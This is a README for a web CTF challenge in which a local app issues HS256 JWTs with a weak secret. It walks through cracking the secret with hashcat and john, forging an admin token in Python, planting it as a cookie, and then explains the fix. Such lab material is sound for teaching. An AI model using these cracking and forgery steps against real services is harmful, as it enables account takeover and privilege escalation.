# JWT Weak Secret — CTF Challenge

**Category:** Web  
**Difficulty:** Easy  

## Description

Login as `guest:guest` and receive a JWT. The token is signed with HS256 using a weak secret.
Crack the secret, forge a new token with `role: admin`, and retrieve the flag.

## Setup

```bash
docker compose up --build
```

Visit: http://localhost:8092

## Attack Steps

### 1. Get a token
Login with `guest:guest`. Copy the JWT from the dashboard.

### 2. Crack the secret

```bash
# hashcat (GPU — fast)
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt

# john (CPU)
echo '<token>' > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

The secret is in the top 10 of every common wordlist.

### 3. Forge an admin token

```python
import jwt  # pip install pyjwt

token = jwt.encode(
    {"username": "admin", "role": "admin", "iat": 0},
    "secret",          # cracked secret
    algorithm="HS256"
)
print(token)
```

Or with curl:
```bash
python3 -c "
import base64, hmac, hashlib, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({'alg':'HS256','typ':'JWT'}))
payload = b64url(json.dumps({'username':'admin','role':'admin','iat':0}))
msg     = f'{header}.{payload}'
sig     = b64url(hmac.new(b'secret', msg.encode(), hashlib.sha256).digest())
print(f'{msg}.{sig}')
"
```

### 4. Set the cookie and get the flag

In browser DevTools:
```js
document.cookie = "token=<forged_token>; path=/"
```

Then reload — the admin area will show the flag.

## Why it's vulnerable

- `HS256` signing is only as secure as the secret key
- Short or dictionary-word secrets can be brute-forced offline — no rate limiting, no lockout
- The fix: use a long random secret (`openssl rand -hex 32`)
